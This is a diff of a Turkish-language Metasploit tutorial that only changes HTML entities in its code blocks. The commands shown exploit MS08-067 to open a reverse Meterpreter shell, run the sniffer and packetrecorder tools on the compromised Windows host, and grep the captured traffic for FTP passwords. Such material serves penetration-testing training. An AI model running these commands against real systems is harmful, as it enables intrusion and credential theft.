@@ -42,18 +42,18 @@ Meterpreter `sniffer` eklentisi MicroOLAP Packet Sniffer SDK kullanır. Paketler
 
 
 ```bash
-msf **&gt;** use exploit/windows/smb/ms08_067_netapi
-msf exploit**(**ms08_067_netapi**)** **&gt;** set PAYLOAD windows/meterpeter/reverse_tcp
-msf exploit**(**ms08_067_netapi**)** **&gt;** set LHOST 10.211.55.126
-msf exploit**(**ms08_067_netapi**)** **&gt;** set RHOST 10.10.1.119
-msf exploit**(**ms08_067_netapi**)** **&gt;** exploit
+msf **>** use exploit/windows/smb/ms08_067_netapi
+msf exploit**(**ms08_067_netapi**)** **>** set PAYLOAD windows/meterpeter/reverse_tcp
+msf exploit**(**ms08_067_netapi**)** **>** set LHOST 10.211.55.126
+msf exploit**(**ms08_067_netapi**)** **>** set RHOST 10.10.1.119
+msf exploit**(**ms08_067_netapi**)** **>** exploit
 
 **[*********]** Handler binding to LHOST 0.0.0.0
 **[*********]** Started reverse handler
 **[*********]** Triggering the vulnerability...
 **[*********]** Transmitting intermediate stager **for **over-sized stage...**(**216 bytes**)**
 **[*********]** Sending stage **(**205824 bytes**)**
-**[*********]** Meterpreter session 1 opened **(**10.10.1.4:4444 -&gt; 10.10.1.119:1921**)**
+**[*********]** Meterpreter session 1 opened **(**10.10.1.4:4444 -> 10.10.1.119:1921**)**
 ```
 
 
@@ -66,10 +66,10 @@ Meterpreter oturumu açıldığında `use sniffer` komutuyla eklentiyi aktif hal
 
 
 ```bash
-meterpreter **&gt;** use sniffer
+meterpreter **>** use sniffer
 Loading extension sniffer...success.
 
-meterpreter **&gt;** help
+meterpreter **>** help
 
 Sniffer Commands
 **================**
@@ -93,7 +93,7 @@ Hedef sistemde hangi ağ arayüzlerinin aktif olduğunu görmek için `sniffer_i
 
 
 ```bash
-meterpreter **&gt;** sniffer_interfaces
+meterpreter **>** sniffer_interfaces
 
 1 - 'VMware Accelerated AMD PCNet Adapter' **(** type:0 mtu:1514 usable:true dhcp:true wifi:false **)**
 ```
@@ -108,7 +108,7 @@ Bizim örneğimizde 1 adet arayüz bulunmaktadır. Bu ağ cihazını dinlemek i�
 
 
 ```bash
-meterpreter **&gt;** sniffer_start 1
+meterpreter **>** sniffer_start 1
 **[*********]** Capture started on interface 1 **(**200000 packet buffer**)**
 ```
 
@@ -122,11 +122,11 @@ Dinleme işlemi devam ederken, ne kadar paketin kayıt edildiğini görmek için
 
 
 ```bash
-meterpreter **&gt;** sniffer_dump 1 /tmp/all.cap
+meterpreter **>** sniffer_dump 1 /tmp/all.cap
 **[*********]** Dumping packets from interface 1...
 **[*********]** Wrote 19 packets to PCAP file /tmp/all.cap
 
-meterpreter **&gt;** sniffer_dump 1 /tmp/all.cap
+meterpreter **>** sniffer_dump 1 /tmp/all.cap
 **[*********]** Dumping packets from interface 1...
 **[*********]** Wrote 199 packets to PCAP file /tmp/all.cap
 ```
@@ -145,7 +145,7 @@ Meterpreter `sniffer` eklentisinin yanında paket dinleme için geliştirilen `p
 
 
 ```bash
-meterpreter **&gt;** run packetrecorder 
+meterpreter **>** run packetrecorder 
 Meterpreter Script **for **capturing packets **in **to a PCAP file
 on a target host given a interface ID.
 
@@ -164,7 +164,7 @@ Dinlemeye başlamadan önce, dinlenebilir arayüzlerin listesini kontrol edelim.
 
 
 ```bash
-meterpreter **&gt;** run packetrecorder -li
+meterpreter **>** run packetrecorder -li
 
 1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' **(** type:4294967295 mtu:0 usable:false dhcp:false wifi:false **)**
 2 - 'Citrix XenServer PV Ethernet Adapter' **(** type:0 mtu:1514 usable:true dhcp:true wifi:false **)**
@@ -177,7 +177,7 @@ Bu örneğimizde 3 adet ağ cihazı olduğunu görüyoruz. `-i 2` seçeneği ile
 
 
 ```bash
-meterpreter **&gt;** run packetrecorder -i 2 -l /root/
+meterpreter **>** run packetrecorder -i 2 -l /root/
 **[*********]** Starting Packet capture on interface 2
 **[**+] Packet capture started
 **[*********]** Packets being saved **in **to /root/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105/XEN-XP-SP2-BARE_20101119.5105.cap
@@ -185,7 +185,7 @@ meterpreter **&gt;** run packetrecorder -i 2 -l /root/
 ^C
 **[*********]** Interrupt 
 **[**+] Stopping Packet sniffer...
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -196,5 +196,5 @@ Kayıt edilen PCAP dosyasını `wireshark` veya `tshark` programıyla analiz ede
 ```bash
 root@kali:~/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105# tshark -r XEN-XP-SP2-BARE_20101119.5105.cap |grep PASS
 Running as user "root" and group "root". This could be dangerous.
-2489  82.000000 192.168.1.201 -&gt; 209.132.183.61 FTP Request: PASS s3cr3t
-2685  96.000000 192.168.1.201 -&gt; 209.132.183.61 FTP Request: PASS s3cr3t```
+2489  82.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t
+2685  96.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t```
